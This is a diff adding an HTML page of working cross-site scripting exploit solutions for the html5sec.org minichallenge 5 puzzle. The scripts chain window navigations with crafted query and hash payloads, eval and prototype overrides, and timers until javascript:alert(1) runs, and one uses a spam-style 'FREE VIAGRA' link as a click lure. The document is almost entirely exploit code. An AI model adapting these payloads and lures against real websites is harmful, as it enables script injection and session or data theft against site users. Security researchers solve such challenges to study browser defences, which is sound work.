@@ -1,0 +1,76 @@
+<script>
+var xss = "self[[typeof [[[d=self.w][w=self.u]][self[self.u]=eval]][Array.prototype.valueOf=URL]][0][2]]",
+hashes = [
+  "#onerror",
+  "#Uncaught",
+  "#+alert(1)",
+  "#https://cure53.de/\\"
+], i=0, w;
+
+function step() {
+  var hash = hashes[i++];
+  if (hash) {
+    var url = "https://html5sec.org/minichallenges/5?xss=" + xss + hash;
+    if (i>1) { 
+      w.location = url;
+      setTimeout(step, 100);
+    } else {
+      w = open(url);
+      setTimeout(step, 500);
+    }
+  }
+}
+step();
+</script>
+
+
+<script>
+function foo() {
+    // set b="location"
+    window.open("https://html5sec.org/minichallenges/5?xss=[this[this.b]=this.u][b=this.u]#location","xss");
+    setTimeout(function(){
+        // set u="javascript:alert(1)"
+        window.open("https://html5sec.org/minichallenges/5?xss=[this[this.b]=this.u][b=this.u]#javascript:alert(1)","xss");
+        setTimeout(function(){
+            // execute
+            window.open("https://html5sec.org/minichallenges/5?xss=[this[this.b]=this.u][b=this.u]#w00t","xss");
+        }, 100);
+    }, 100);
+}
+</script>
+<a onclick="foo()"><h1>FREE VIAGRA! --&gt;Click&lt;--</h1></a>
+  
+  <big><a href="javascript:exploit()">Click here for the magic.</a></big>
+<script>
+
+function createURL(xss, hash) {
+   xss = encodeURIComponent(xss);
+   hash = hash;
+   return `https://html5sec.org/minichallenges/5?xss=${xss}#${hash}`;
+
+}
+var currentURL='';
+var win;
+
+function exploit() {
+   currentURL = createURL("localStorage.x=top.u", "String");
+   win = window.open(currentURL, '_blank');
+   setTimeout(exploit2, 1000);
+}
+
+function exploit2() {
+   win.location = currentURL + 'x';
+   setTimeout(exploit3, 100);
+}
+
+function exploit3() {
+   let newURL = createURL('top[localStorage.x].prototype.match=escape',
+'javascript:alert(1)');
+   win.location = newURL;
+}
+</script>
+
+<input type="button" onclick="u =
+'https://html5sec.org/minichallenges/5?xss=[Array[typeof%20status]%20=%20Array][[Array[typeof%20u]%20=%20this[this.u]][Array[typeof%20status].prototype.match%20=%20isNaN]]#',
+v = u + 'javascript:alert(1)'; w = window.open(u + 'String');
+setTimeout('w.location = v', 1000);" value="click me!">
